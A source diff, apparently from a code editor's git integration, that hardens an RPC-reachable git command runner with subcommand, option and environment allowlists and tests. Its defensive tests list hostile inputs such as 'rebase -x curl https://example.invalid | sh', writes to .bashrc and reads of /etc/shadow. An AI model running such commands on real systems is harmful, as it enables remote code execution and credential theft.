@@ -660,6 +660,7 @@ pub struct Remote {
     pub name: SharedString,
 }
 
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum ResetMode {
     /// Reset the branch pointer, leave index and worktree unchanged (this will make it look like things that were
     /// committed are now staged).
@@ -667,6 +668,12 @@ pub enum ResetMode {
     /// Reset the branch pointer and index, leave worktree unchanged (this makes it look as though things that were
     /// committed are now unstaged).
     Mixed,
+    /// Reset the branch pointer, the index and the worktree, throwing uncommitted work away.
+    ///
+    /// Only `Repository::reset_to` (which goes through [`GitRepository::run_command`] and always
+    /// confirms with the user first) produces this; [`GitRepository::reset`] serves the git
+    /// panel's "uncommit", which never resets hard.
+    Hard,
 }
 
 #[derive(Debug, Clone, Hash, PartialEq, Eq)]
@@ -829,7 +836,367 @@ impl GitCommandOutput {
 /// launch an arbitrary program. Pinning the first argument to a known
 /// subcommand keeps this one escape hatch limited to the operations the git
 /// panel actually needs.
-pub const ALLOWED_GIT_COMMANDS: &[&str] = &["apply", "diff", "format-patch", "merge", "reset"];
+pub const ALLOWED_GIT_COMMANDS: &[&str] = &[
+    "apply",
+    "branch",
+    "checkout",
+    "cherry-pick",
+    "commit",
+    "commit-tree",
+    "describe",
+    "diff",
+    "for-each-ref",
+    "format-patch",
+    "log",
+    "merge",
+    "rebase",
+    "reset",
+    "rev-parse",
+    "revert",
+    "show",
+    "switch",
+    "tag",
+];
+
+/// Environment variables [`GitRepository::run_command`] accepts from its caller.
+///
+/// The environment is attacker-shaped input for the same reason the arguments are: `GIT_EDITOR`,
+/// `GIT_SEQUENCE_EDITOR`, `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF` and friends all name a program
+/// git will run. Only the three variables `commit-tree` reads to keep a rewritten commit's
+/// original author get through.
+pub const ALLOWED_GIT_COMMAND_ENV: &[&str] =
+    &["GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_AUTHOR_DATE"];
+
+/// Subcommands of [`ALLOWED_GIT_COMMANDS`] that run repository hooks, with the Japanese name of
+/// the operation for the error an untrusted project gets on a git too old to disable them
+/// (ADR-F47).
+pub const HOOK_RUNNING_GIT_COMMANDS: &[(&str, &str)] = &[
+    ("checkout", "チェックアウト"),
+    ("cherry-pick", "コミットの取り込み (cherry-pick)"),
+    ("commit", "コミット"),
+    ("merge", "マージ"),
+    ("rebase", "リベース"),
+    ("revert", "コミットの打ち消し (revert)"),
+    ("switch", "ブランチの切り替え"),
+];
+
+/// Options [`validate_git_command`] refuses wherever they appear.
+///
+/// Pinning the first argument to a subcommand is not enough on its own, because several of the
+/// subcommands above take an option that reaches outside the repository: `rebase --exec <cmd>`
+/// runs a program of the caller's choosing between commits, `--output=<path>` writes git's output
+/// over any file the host user can write, `--file=<path>` reads any file the host user can read
+/// into a message the caller can print back with `log`, `--ext-diff` and `--textconv` hand the
+/// repository's own configuration a program to run, and `--help` does the same through `help.*`.
+/// No wrapper in this fork needs any of them, and `run_command` is reachable over RPC.
+const REFUSED_GIT_LONG_OPTIONS: &[&str] = &[
+    "--exec",
+    "--exec-path",
+    "--ext-diff",
+    "--file",
+    "--help",
+    "--output",
+    "--output-directory",
+    "--textconv",
+];
+
+/// The short spellings of [`REFUSED_GIT_LONG_OPTIONS`]: `-x` is `rebase --exec` and `-F` is
+/// `--file`. Either can carry its value attached (`-xcurl …`) or sit in a bundle of flags (`-nx`).
+/// `cherry-pick -x`, which only appends a line to the message, goes with them; nothing here needs
+/// it.
+const REFUSED_GIT_SHORT_OPTIONS: &[char] = &['x', 'F'];
+
+/// Subcommands whose `-m` / `--message` reads the next argument as free text.
+///
+/// git never parses that argument as an option however it is spelled, so neither does
+/// [`validate_git_command`]: a commit message may perfectly well start with `-`. Subcommands
+/// where `-m` is a flag instead (`rebase --merge`, `log -m`, …) are deliberately absent, so that
+/// a caller cannot hide `-x` behind one.
+const MESSAGE_TAKING_GIT_COMMANDS: &[&str] = &[
+    "cherry-pick",
+    "commit",
+    "commit-tree",
+    "merge",
+    "revert",
+    "tag",
+];
+
+/// Rejects a command whose first argument is not one of [`ALLOWED_GIT_COMMANDS`], or that carries
+/// one of [`REFUSED_GIT_LONG_OPTIONS`], handing back the subcommand when it is allowed.
+///
+/// Every [`GitRepository::run_command`] implementation calls this, so that a wrapper building a
+/// command nobody allowed fails the same way against the fake repository as against a real one.
+pub fn validate_git_command(args: &[String]) -> Result<&str> {
+    let subcommand = args.first().context("no git subcommand given")?.as_str();
+    anyhow::ensure!(
+        ALLOWED_GIT_COMMANDS.contains(&subcommand),
+        "unsupported git command: {subcommand}"
+    );
+    let takes_message = MESSAGE_TAKING_GIT_COMMANDS.contains(&subcommand);
+    let mut argument_is_message = false;
+    for argument in args.iter().skip(1) {
+        if std::mem::take(&mut argument_is_message) {
+            continue;
+        }
+        if takes_message && (argument == "-m" || argument == "--message") {
+            argument_is_message = true;
+            continue;
+        }
+        anyhow::ensure!(
+            !is_refused_git_argument(argument),
+            "unsupported git command argument: {argument}"
+        );
+    }
+    Ok(subcommand)
+}
+
+fn is_refused_git_argument(argument: &str) -> bool {
+    if let Some(long_option) = argument.strip_prefix("--") {
+        let name = long_option
+            .split_once('=')
+            .map_or(long_option, |(name, _)| name);
+        return REFUSED_GIT_LONG_OPTIONS
+            .iter()
+            .any(|refused| refused.strip_prefix("--") == Some(name));
+    }
+    let Some(short_options) = argument.strip_prefix('-') else {
+        return false;
+    };
+    match short_options.chars().next() {
+        // `-x<value>`, where git reads the rest of the argument as the option's value.
+        Some(letter) if REFUSED_GIT_SHORT_OPTIONS.contains(&letter) => true,
+        // A bundle of flags (`-nx`). Anything else starting with `-` is a value git will not read
+        // as an option, such as a negative number or a message.
+        _ => {
+            short_options
+                .chars()
+                .all(|letter| letter.is_ascii_alphabetic())
+                && short_options
+                    .chars()
+                    .any(|letter| REFUSED_GIT_SHORT_OPTIONS.contains(&letter))
+        }
+    }
+}
+
+/// Rejects caller-supplied environment variables outside [`ALLOWED_GIT_COMMAND_ENV`].
+pub fn validate_git_command_env(command_env: &HashMap<String, String>) -> Result<()> {
+    for name in command_env.keys() {
+        anyhow::ensure!(
+            ALLOWED_GIT_COMMAND_ENV.contains(&name.as_str()),
+            "unsupported git command environment variable: {name}"
+        );
+    }
+    Ok(())
+}
+
+/// A tag, as `Repository::tags` reads it back from `for-each-ref`.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct TagInfo {
+    /// Short name, with `refs/tags/` stripped.
+    pub name: String,
+    /// The commit the tag points at; for an annotated tag this is the peeled commit rather than
+    /// the tag object.
+    pub commit_sha: String,
+    pub created_at_unix: Option<i64>,
+    /// First line of an annotated tag's message.
+    pub subject: Option<String>,
+    pub annotated: bool,
+}
+
+/// The `--format` `Repository::tags` hands to `for-each-ref`.
+///
+/// `%(creatordate:raw)` rather than `:unix`, which git only learned in 2.9.4 (ADR-F47); the raw
+/// form has printed `<seconds> <offset>` since long before that.
+pub const TAG_LIST_FORMAT: &str = "%(refname:short)%00%(objecttype)%00%(objectname)%00%(*objectname)%00%(creatordate:raw)%00%(contents:subject)";
+
+impl TagInfo {
+    /// Parses `for-each-ref` output produced with [`TAG_LIST_FORMAT`].
+    pub fn parse_list(stdout: &str) -> Vec<TagInfo> {
+        stdout.lines().filter_map(Self::parse_line).collect()
+    }
+
+    fn parse_line(line: &str) -> Option<TagInfo> {
+        let mut fields = line.trim_end_matches('\r').split('\0');
+        let name = fields.next()?;
+        let object_type = fields.next()?;
+        let object_sha = fields.next()?;
+        let peeled_sha = fields.next()?;
+        let created_at = fields.next().unwrap_or_default();
+        let subject = fields.next().unwrap_or_default();
+        if name.is_empty() || object_sha.is_empty() {
+            return None;
+        }
+        let annotated = object_type == "tag";
+        let commit_sha = if peeled_sha.is_empty() {
+            object_sha
+        } else {
+            peeled_sha
+        };
+        Some(TagInfo {
+            name: name.to_owned(),
+            commit_sha: commit_sha.to_owned(),
+            created_at_unix: created_at
+                .split_whitespace()
+                .next()
+                .and_then(|seconds| seconds.parse().ok()),
+            subject: (annotated && !subject.is_empty()).then(|| subject.to_owned()),
+            annotated,
+        })
+    }
+}
+
+/// How far a commit sits past the nearest tag, from `git describe --tags --long`.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct TagDistance {
+    pub tag: String,
+    /// `0` when the commit itself carries the tag.
+    pub commits_since: u32,
+    pub short_sha: String,
+}
+
+impl TagDistance {
+    /// Parses `v1.2.3-5-gabcdef`. A tag name may contain `-` itself, so the count and the
+    /// abbreviated sha are taken from the right.
+    pub fn parse(described: &str) -> Option<TagDistance> {
+        let (rest, abbreviated) = described.trim().rsplit_once('-')?;
+        let short_sha = abbreviated.strip_prefix('g')?;
+        let (tag, commits_since) = rest.rsplit_once('-')?;
+        if tag.is_empty() || short_sha.is_empty() {
+            return None;
+        }
+        Some(TagDistance {
+            tag: tag.to_owned(),
+            commits_since: commits_since.parse().ok()?,
+            short_sha: short_sha.to_owned(),
+        })
+    }
+}
+
+/// The three operations that can stop part-way and leave the repository waiting for the user.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum SequencerKind {
+    CherryPick,
+    Revert,
+    Rebase,
+}
+
+impl SequencerKind {
+    /// The subcommand whose `--continue` / `--skip` / `--abort` drives this operation.
+    pub fn subcommand(self) -> &'static str {
+        match self {
+            Self::CherryPick => "cherry-pick",
+            Self::Revert => "revert",
+            Self::Rebase => "rebase",
+        }
+    }
+
+    /// The pseudo-ref git keeps while the operation is stopped.
+    ///
+    /// `REBASE_HEAD` only exists from git 2.13, so on an older git a stopped rebase is reported as
+    /// "nothing in progress" rather than wrongly as a cherry-pick.
+    pub fn in_progress_ref(self) -> &'static str {
+        match self {
+            Self::CherryPick => "CHERRY_PICK_HEAD",
+            Self::Revert => "REVERT_HEAD",
+            Self::Rebase => "REBASE_HEAD",
+        }
+    }
+
+    /// Name shown to the user, in the git panel's banner and in error messages.
+    pub fn label(self) -> &'static str {
+        match self {
+            Self::CherryPick => "コミットの取り込み (cherry-pick)",
+            Self::Revert => "コミットの打ち消し (revert)",
+            Self::Rebase => "リベース (rebase)",
+        }
+    }
+
+    /// The order `Repository::sequencer_state` probes these in.
+    ///
+    /// Rebase comes first because a rebase that stops on a conflict also leaves `CHERRY_PICK_HEAD`
+    /// behind (its picks go through the same sequencer), and reporting it as a cherry-pick would
+    /// offer the user `git cherry-pick --continue`, which cannot finish a rebase.
+    pub fn all() -> [SequencerKind; 3] {
+        [Self::Rebase, Self::CherryPick, Self::Revert]
+    }
+}
+
+/// A `cherry-pick` / `revert` / `rebase` that stopped part-way.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SequencerState {
+    pub kind: SequencerKind,
+    /// The index still has unmerged paths.
+    pub conflicted: bool,
+}
+
+/// What [`GitRepository::run_command`] has to change about a caller's arguments so that an older
+/// git does the same thing (ADR-F47).
+///
+/// The substitution happens where git runs rather than where the arguments are built: a remote
+/// project's client only reaches the host's git through `run_command` and cannot see its version.
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct AdaptedGitCommand {
+    args: Vec<String>,
+    /// `--autostash` was dropped because this git predates it, so the rebase now needs a clean
+    /// worktree.
+    dropped_autostash: bool,
+}
+
+fn adapt_command_to_git_version(
+    args: Vec<String>,
+    version: Option<GitVersion>,
+) -> AdaptedGitCommand {
+    let mut dropped_autostash = false;
+    let args = match args.first().map(String::as_str) {
+        Some("switch") if !GitFeature::SwitchAndRestore.is_supported_by(version) => args
+            .into_iter()
+            .enumerate()
+            .map(|(index, argument)| match (index, argument.as_str()) {
+                (0, _) => "checkout".to_string(),
+                (_, "-c") => "-b".to_string(),
+                (_, "-C") => "-B".to_string(),
+                _ => argument,
+            })
+            .collect(),
+        Some("rebase") if !GitFeature::RebaseAutostash.is_supported_by(version) => {
+            let mut kept = Vec::with_capacity(args.len());
+            for argument in args {
+                if argument == "--autostash" {
+                    dropped_autostash = true;
+                } else {
+                    kept.push(argument);
+                }
+            }
+            kept
+        }
+        _ => args,
+    };
+    AdaptedGitCommand {
+        args,
+        dropped_autostash,
+    }
+}
+
+/// Refuses, with the ADR-F47 wording, a command an older git would only answer with a usage
+/// error.
+///
+/// `cherry-pick --skip` / `revert --skip` (git 2.22) is the git panel banner's "skip" button;
+/// `rebase --skip`, `--continue` and `--abort` are far older than any version this fork supports,
+/// and there is no way to skip a pick on an older git that does not risk the user's work
+/// (`reset --hard` + `--continue` throws away whatever they had resolved), so the button says so
+/// instead of guessing.
+fn ensure_arguments_are_supported(
+    subcommand: &str,
+    args: &[String],
+    version: Option<GitVersion>,
+) -> Result<()> {
+    if matches!(subcommand, "cherry-pick" | "revert")
+        && args.iter().any(|argument| argument == "--skip")
+    {
+        GitFeature::SequencerSkip.require(version, "このコミットのスキップ")?;
+    }
+    Ok(())
+}
 
 /// What a patch file created from the git panel should contain.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -1147,13 +1514,18 @@ pub trait GitRepository: Send + Sync {
     /// raw output rather than failing on a non-zero exit status.
     ///
     /// This is the single escape hatch behind the git panel's merge / hard
-    /// reset / patch operations, so that each of them costs one typed wrapper
-    /// on [`crate::repository::GitRepository`] instead of its own RPC message.
+    /// reset / patch / history-rewriting operations, so that each of them costs
+    /// one typed wrapper on [`crate::repository::GitRepository`] instead of its
+    /// own RPC message.
+    ///
+    /// `env` is the repository's own environment; `command_env` is what the
+    /// caller asked for and is validated against [`ALLOWED_GIT_COMMAND_ENV`].
     fn run_command(
         &self,
         args: Vec<String>,
         stdin: Option<String>,
         env: Arc<HashMap<String, String>>,
+        command_env: HashMap<String, String>,
     ) -> BoxFuture<'_, Result<GitCommandOutput>>;
 
     fn diff_stat(
@@ -1253,7 +1625,11 @@ pub enum DiffStatType {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, JsonSchema)]
 pub enum PushOptions {
     SetUpstream,
+    /// `--force-with-lease`: refuses to overwrite commits the remote gained since the last fetch.
     Force,
+    /// Plain `--force`, which overwrites the remote branch whatever it holds. Only reachable from
+    /// a menu item that says so and a confirmation prompt.
+    ForceWithoutLease,
 }
 
 impl std::fmt::Debug for dyn GitRepository {
@@ -1629,6 +2005,7 @@ impl GitRepository for RealGitRepository {
             let mode_flag = match mode {
                 ResetMode::Mixed => "--mixed",
                 ResetMode::Soft => "--soft",
+                ResetMode::Hard => "--hard",
             };
 
             let output = git
@@ -2636,22 +3013,53 @@ impl GitRepository for RealGitRepository {
         args: Vec<String>,
         stdin: Option<String>,
         env: Arc<HashMap<String, String>>,
+        command_env: HashMap<String, String>,
     ) -> BoxFuture<'_, Result<GitCommandOutput>> {
         let git = self.git_binary_in_worktree();
         self.executor
             .spawn(async move {
-                let subcommand = args.first().context("no git subcommand given")?;
-                anyhow::ensure!(
-                    ALLOWED_GIT_COMMANDS.contains(&subcommand.as_str()),
-                    "unsupported git command: {subcommand}"
-                );
+                let subcommand = validate_git_command(&args)?;
+                validate_git_command_env(&command_env)?;
 
                 let git = git?;
-                if subcommand.as_str() == "merge" {
-                    git.ensure_hooks_are_disabled_if_untrusted("マージ").await?;
+                if let Some((_, operation)) = HOOK_RUNNING_GIT_COMMANDS
+                    .iter()
+                    .find(|(name, _)| *name == subcommand)
+                {
+                    git.ensure_hooks_are_disabled_if_untrusted(operation).await?;
                 }
-                let mut command = git.build_command(&args).await;
+
+                ensure_arguments_are_supported(subcommand, &args, git.version().await)?;
+                let adapted = adapt_command_to_git_version(args, git.version().await);
+                if adapted.dropped_autostash {
+                    // `--untracked-files=no`, because the stash `--autostash` takes would not have
+                    // covered untracked files either: refusing over them would leave the user with
+                    // an error they cannot act on.
+                    let status = git
+                        .build_command(&["status", "--porcelain", "--untracked-files=no"])
+                        .await
+                        .output()
+                        .await?;
+                    anyhow::ensure!(
+                        status.stdout.is_empty(),
+                        "この git ({}) は rebase --autostash に対応していないため、作業ツリーの変更をコミットかスタッシュしてから実行してください (git {} 以上が必要です)。",
+                        git.version()
+                            .await
+                            .map_or_else(|| "版不明".to_string(), |version| version.to_string()),
+                        GitFeature::RebaseAutostash.minimum_version()
+                    );
+                }
+
+                let mut command = git.build_command(&adapted.args).await;
                 command.envs(env.iter());
+                command.envs(&command_env);
+                // Last, so that neither the repository's environment nor the caller's can put an
+                // editor back. There is no terminal behind this process, so git must never try to
+                // open one (`cherry-pick --continue`, `commit` without `-m`, `tag -a`, …): it
+                // would hang the git worker. `:` is the one value git treats as "launch nothing",
+                // so this also keeps an untrusted repository's `core.editor` from running.
+                command.env("GIT_EDITOR", ":");
+                command.env("GIT_SEQUENCE_EDITOR", ":");
 
                 let output = if let Some(stdin_contents) = stdin {
                     let mut child = command
@@ -3049,6 +3457,7 @@ impl GitRepository for RealGitRepository {
                 .args(options.map(|option| match option {
                     PushOptions::SetUpstream => "--set-upstream",
                     PushOptions::Force => "--force-with-lease",
+                    PushOptions::ForceWithoutLease => "--force",
                 }))
                 .arg(remote_name)
                 .arg(format!("{}:{}", branch_name, remote_branch_name))
@@ -4098,6 +4507,10 @@ enum GitFeature {
     DiffMergeBase,
     /// `git stash push --staged`.
     StashStaged,
+    /// `git rebase --autostash`.
+    RebaseAutostash,
+    /// `git cherry-pick --skip` and `git revert --skip`.
+    SequencerSkip,
 }
 
 impl GitFeature {
@@ -4116,6 +4529,7 @@ impl GitFeature {
             // The oldest release seen working; 2.7.4 is the newest seen crashing.
             Self::NoPagerWorktree => GitVersion::new(2, 11, 0),
             Self::WorktreeAdd => GitVersion::new(2, 5, 0),
+            Self::RebaseAutostash => GitVersion::new(2, 6, 0),
             Self::PorcelainVersion => GitVersion::new(2, 11, 0),
             // Fixed by 2.14.0 and backported to 2.13.2.
             Self::CleanKeepsIgnoredFiles => GitVersion::new(2, 14, 0),
@@ -4125,6 +4539,7 @@ impl GitFeature {
             Self::UnixDateFormat => GitVersion::new(2, 9, 4),
             Self::ProtocolAllow => GitVersion::new(2, 12, 0),
             Self::UpstreamGone | Self::StashPush => GitVersion::new(2, 13, 0),
+            Self::SequencerSkip => GitVersion::new(2, 22, 0),
             Self::NoOptionalLocks => GitVersion::new(2, 15, 0),
             Self::WorktreeRemove => GitVersion::new(2, 17, 0),
             Self::StatusNoRenames | Self::StashPushWithUntrackedPaths => GitVersion::new(2, 18, 0),
@@ -6428,6 +6843,7 @@ mod tests {
                 ],
                 None,
                 Arc::new(HashMap::default()),
+                HashMap::default(),
             )
             .await
             .expect_err("configuration arguments must be rejected");
@@ -6437,7 +6853,12 @@ mod tests {
         );
 
         let error = repository
-            .run_command(vec!["log".into()], None, Arc::new(HashMap::default()))
+            .run_command(
+                vec!["config".into(), "core.pager".into()],
+                None,
+                Arc::new(HashMap::default()),
+                HashMap::default(),
+            )
             .await
             .expect_err("subcommands outside the allowlist must be rejected");
         assert!(
@@ -6446,7 +6867,12 @@ mod tests {
         );
 
         let error = repository
-            .run_command(Vec::new(), None, Arc::new(HashMap::default()))
+            .run_command(
+                Vec::new(),
+                None,
+                Arc::new(HashMap::default()),
+                HashMap::default(),
+            )
             .await
             .expect_err("an empty command must be rejected");
         assert!(
@@ -6514,6 +6940,7 @@ mod tests {
                 vec!["merge".into(), "feature".into()],
                 None,
                 Arc::new(test_commit_envs()),
+                HashMap::default(),
             )
             .await
             .unwrap();
@@ -6549,6 +6976,7 @@ mod tests {
                 vec!["merge".into(), "feature".into()],
                 None,
                 Arc::new(test_commit_envs()),
+                HashMap::default(),
             )
             .await
             .expect("a conflicted merge must not be reported as a failed command");
@@ -6580,6 +7008,7 @@ mod tests {
                 vec!["reset".into(), "--hard".into(), "origin/main".into()],
                 None,
                 Arc::new(HashMap::default()),
+                HashMap::default(),
             )
             .await
             .unwrap();
@@ -6592,6 +7021,555 @@ mod tests {
         assert_eq!(
             git_command_output(&clone_directory, ["rev-parse", "HEAD"]),
             git_command_output(&clone_directory, ["rev-parse", "origin/main"])
+        );
+    }
+
+    #[test]
+    fn test_tag_distance_parse() {
+        assert_eq!(
+            TagDistance::parse("v1.2.3-5-gabcdef\n"),
+            Some(TagDistance {
+                tag: "v1.2.3".into(),
+                commits_since: 5,
+                short_sha: "abcdef".into(),
+            })
+        );
+        // `--long` still prints the count on the tagged commit itself.
+        assert_eq!(
+            TagDistance::parse("v1.2.3-0-g0123456").map(|distance| distance.commits_since),
+            Some(0)
+        );
+        // A tag name may contain the separator, so the fields are read from the right.
+        assert_eq!(
+            TagDistance::parse("release-1.0-12-gdeadbee"),
+            Some(TagDistance {
+                tag: "release-1.0".into(),
+                commits_since: 12,
+                short_sha: "deadbee".into(),
+            })
+        );
+        assert_eq!(TagDistance::parse("v1.2.3"), None);
+        assert_eq!(TagDistance::parse("v1.2.3-5-abcdef"), None);
+        assert_eq!(TagDistance::parse(""), None);
+    }
+
+    #[test]
+    fn test_tag_info_parse_list() {
+        let annotated =
+            "v2.0.0\u{0}tag\u{0}aaaa1111\u{0}bbbb2222\u{0}1700000000 +0900\u{0}リリース 2.0";
+        let lightweight = "v1.0.0\u{0}commit\u{0}cccc3333\u{0}\u{0}1600000000 +0000\u{0}";
+        let without_date = "wip\u{0}commit\u{0}dddd4444\u{0}\u{0}\u{0}";
+        let tags = TagInfo::parse_list(&format!("{annotated}\n{lightweight}\n{without_date}\n"));
+
+        assert_eq!(
+            tags,
+            vec![
+                TagInfo {
+                    name: "v2.0.0".into(),
+                    // The peeled commit, not the tag object.
+                    commit_sha: "bbbb2222".into(),
+                    created_at_unix: Some(1_700_000_000),
+                    subject: Some("リリース 2.0".into()),
+                    annotated: true,
+                },
+                TagInfo {
+                    name: "v1.0.0".into(),
+                    commit_sha: "cccc3333".into(),
+                    created_at_unix: Some(1_600_000_000),
+                    subject: None,
+                    annotated: false,
+                },
+                TagInfo {
+                    name: "wip".into(),
+                    commit_sha: "dddd4444".into(),
+                    created_at_unix: None,
+                    subject: None,
+                    annotated: false,
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn test_adapt_command_to_git_version() {
+        let switch: Vec<String> = ["switch", "-c", "mr/1", "main"]
+            .into_iter()
+            .map(str::to_string)
+            .collect();
+        let modern = adapt_command_to_git_version(switch.clone(), Some(GitVersion::new(2, 47, 0)));
+        assert_eq!(modern.args, switch);
+        assert!(!modern.dropped_autostash);
+
+        let old = adapt_command_to_git_version(switch.clone(), Some(GitVersion::new(2, 17, 1)));
+        assert_eq!(old.args, vec!["checkout", "-b", "mr/1", "main"]);
+
+        // An unrecognized version counts as a modern git, like everywhere else.
+        assert_eq!(adapt_command_to_git_version(switch, None).args[0], "switch");
+
+        let rebase: Vec<String> = ["rebase", "--autostash", "--onto", "new", "old", "main"]
+            .into_iter()
+            .map(str::to_string)
+            .collect();
+        let modern = adapt_command_to_git_version(rebase.clone(), Some(GitVersion::new(2, 6, 0)));
+        assert_eq!(modern.args, rebase);
+        assert!(!modern.dropped_autostash);
+
+        let old = adapt_command_to_git_version(rebase, Some(GitVersion::new(2, 5, 0)));
+        assert_eq!(old.args, vec!["rebase", "--onto", "new", "old", "main"]);
+        assert!(
+            old.dropped_autostash,
+            "dropping the flag has to be reported, or the rebase would run on a dirty worktree"
+        );
+    }
+
+    #[test]
+    fn test_git_command_env_allowlist() {
+        let author = HashMap::from_iter([
+            ("GIT_AUTHOR_NAME".to_string(), "Ada".to_string()),
+            (
+                "GIT_AUTHOR_EMAIL".to_string(),
+                "ada@example.com".to_string(),
+            ),
+            (
+                "GIT_AUTHOR_DATE".to_string(),
+                "1700000000 +0900".to_string(),
+            ),
+        ]);
+        validate_git_command_env(&author).expect("the commit-tree author variables are allowed");
+
+        for name in [
+            "GIT_EDITOR",
+            "GIT_SEQUENCE_EDITOR",
+            "GIT_SSH_COMMAND",
+            "GIT_EXTERNAL_DIFF",
+            "PATH",
+        ] {
+            let error = validate_git_command_env(&HashMap::from_iter([(
+                name.to_string(),
+                "arbitrary-program".to_string(),
+            )]))
+            .expect_err("{name} names a program git would run");
+            assert!(
+                error.to_string().contains(name),
+                "unexpected error: {error:#}"
+            );
+        }
+    }
+
+    /// `run_command` is reachable over RPC, so an allowed subcommand must not be usable to start
+    /// a program or to reach a path outside the repository.
+    #[test]
+    fn test_validate_git_command_refuses_arguments_that_reach_outside_the_repository() {
+        let command = |args: &[&str]| -> Vec<String> {
+            args.iter().map(|argument| argument.to_string()).collect()
+        };
+
+        for args in [
+            // Runs the command once per commit.
+            vec![
+                "rebase",
+                "-x",
+                "curl https://example.invalid | sh",
+                "HEAD~2",
+            ],
+            vec!["rebase", "--exec", "touch /tmp/pwned", "HEAD~2"],
+            vec!["rebase", "--exec=touch /tmp/pwned", "HEAD~2"],
+            // A short option carries its value attached, and bundles with other flags.
+            vec!["rebase", "-xtouch /tmp/pwned", "HEAD~2"],
+            vec!["rebase", "-ix", "touch /tmp/pwned", "HEAD~2"],
+            // Writes over any file the host user can write.
+            vec!["log", "--output=/home/user/.bashrc"],
+            vec!["diff", "--output", "/home/user/.bashrc"],
+            // Reads any file the host user can read back out through `log`.
+            vec!["commit", "-F/etc/shadow"],
+            vec!["tag", "--file=/etc/shadow", "v1"],
+            // Runs whatever the repository's own configuration names.
+            vec!["show", "--ext-diff"],
+            vec!["log", "--help"],
+        ] {
+            let error = validate_git_command(&command(&args))
+                .expect_err("this argument names a program or a path outside the repository");
+            assert!(
+                error.to_string().contains("argument"),
+                "unexpected error for {args:?}: {error:#}"
+            );
+        }
+
+        // The commands the wrappers in this fork actually build stay allowed, including a commit
+        // message that looks like an option.
+        for args in [
+            vec!["commit", "--amend", "--only", "-m", "- fixed the parser"],
+            vec![
+                "commit-tree",
+                "abc^{tree}",
+                "-p",
+                "def",
+                "-m",
+                "-x marks it",
+            ],
+            vec!["cherry-pick", "-n", "abc", "def"],
+            vec!["rebase", "--autostash", "--onto", "new", "old", "main"],
+            vec!["switch", "-c", "mr/1", "origin/main"],
+            vec!["format-patch", "--binary", "--stdout", "-1", "HEAD"],
+            vec![
+                "log",
+                "-1",
+                "--format=%an%x00%ae%x00%ad",
+                "--date=raw",
+                "abc",
+            ],
+            vec!["for-each-ref", "--sort=-creatordate", "refs/tags/"],
+            vec!["reset", "--hard", "origin/main"],
+        ] {
+            validate_git_command(&command(&args))
+                .unwrap_or_else(|error| panic!("{args:?} must stay allowed: {error:#}"));
+        }
+    }
+
+    /// `--skip` is the one button on the git panel's banner that older git cannot answer.
+    #[test]
+    fn test_sequencer_skip_needs_a_new_enough_git() {
+        let skip = |subcommand: &str| vec![subcommand.to_string(), "--skip".to_string()];
+
+        for subcommand in ["cherry-pick", "revert"] {
+            let error = ensure_arguments_are_supported(
+                subcommand,
+                &skip(subcommand),
+                Some(GitVersion::new(2, 21, 0)),
+            )
+            .expect_err("git 2.21 has no --skip for the sequencer");
+            assert!(
+                error.to_string().contains("2.22.0"),
+                "unexpected error: {error:#}"
+            );
+            ensure_arguments_are_supported(
+                subcommand,
+                &skip(subcommand),
+                Some(GitVersion::new(2, 22, 0)),
+            )
+            .expect("git 2.22 learned it");
+            ensure_arguments_are_supported(subcommand, &skip(subcommand), None)
+                .expect("an unrecognized version counts as a modern git");
+        }
+
+        ensure_arguments_are_supported("rebase", &skip("rebase"), Some(GitVersion::new(1, 8, 3)))
+            .expect("`rebase --skip` predates every version this fork supports");
+        ensure_arguments_are_supported(
+            "cherry-pick",
+            &["cherry-pick".to_string(), "--continue".to_string()],
+            Some(GitVersion::new(2, 21, 0)),
+        )
+        .expect("only --skip is new");
+    }
+
+    /// The hook guard can only fire for commands `run_command` accepts in the first place.
+    #[test]
+    fn test_hook_running_commands_are_all_allowed() {
+        for (subcommand, operation) in HOOK_RUNNING_GIT_COMMANDS {
+            assert!(
+                ALLOWED_GIT_COMMANDS.contains(subcommand),
+                "{subcommand} runs hooks but is not in the allowlist"
+            );
+            assert!(!operation.is_empty());
+        }
+    }
+
+    #[gpui::test]
+    async fn test_run_command_rejects_environment_outside_the_allowlist(cx: &mut TestAppContext) {
+        disable_git_global_config();
+        cx.executor().allow_parking();
+
+        let repo_dir = tempfile::tempdir().unwrap();
+        git_init_repo(repo_dir.path());
+        let repository = open_repository(repo_dir.path(), cx);
+
+        let error = repository
+            .run_command(
+                vec!["diff".into()],
+                None,
+                Arc::new(HashMap::default()),
+                HashMap::from_iter([(
+                    "GIT_SSH_COMMAND".to_string(),
+                    "arbitrary-program".to_string(),
+                )]),
+            )
+            .await
+            .expect_err("environment variables outside the allowlist must be rejected");
+        assert!(
+            error.to_string().contains("GIT_SSH_COMMAND"),
+            "unexpected error: {error:#}"
+        );
+    }
+
+    /// The plumbing `Repository::reword_commit` drives: an older commit is rebuilt with
+    /// `commit-tree` and the branch is moved onto it, keeping the original author.
+    #[gpui::test]
+    async fn test_run_command_rewrites_an_older_commit_keeping_its_author(cx: &mut TestAppContext) {
+        disable_git_global_config();
+        cx.executor().allow_parking();
+
+        let repo_dir = tempfile::tempdir().unwrap();
+        git_init_repo(repo_dir.path());
+        let file_path = repo_dir.path().join("file.txt");
+
+        fs::write(&file_path, "one\n").unwrap();
+        git_command(repo_dir.path(), ["add", "file.txt"]);
+        git_command(repo_dir.path(), ["commit", "-m", "first"]);
+
+        fs::write(&file_path, "two\n").unwrap();
+        git_command(
+            repo_dir.path(),
+            [
+                "commit",
+                "-am",
+                "second",
+                "--author=Other Person <other@example.com>",
+            ],
+        );
+        let second = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);
+
+        fs::write(&file_path, "three\n").unwrap();
+        git_command(repo_dir.path(), ["commit", "-am", "third"]);
+
+        let repository = open_repository(repo_dir.path(), cx);
+        let env = Arc::new(test_commit_envs());
+
+        let author = repository
+            .run_command(
+                vec![
+                    "log".into(),
+                    "-1".into(),
+                    "--format=%an%x00%ae%x00%ad".into(),
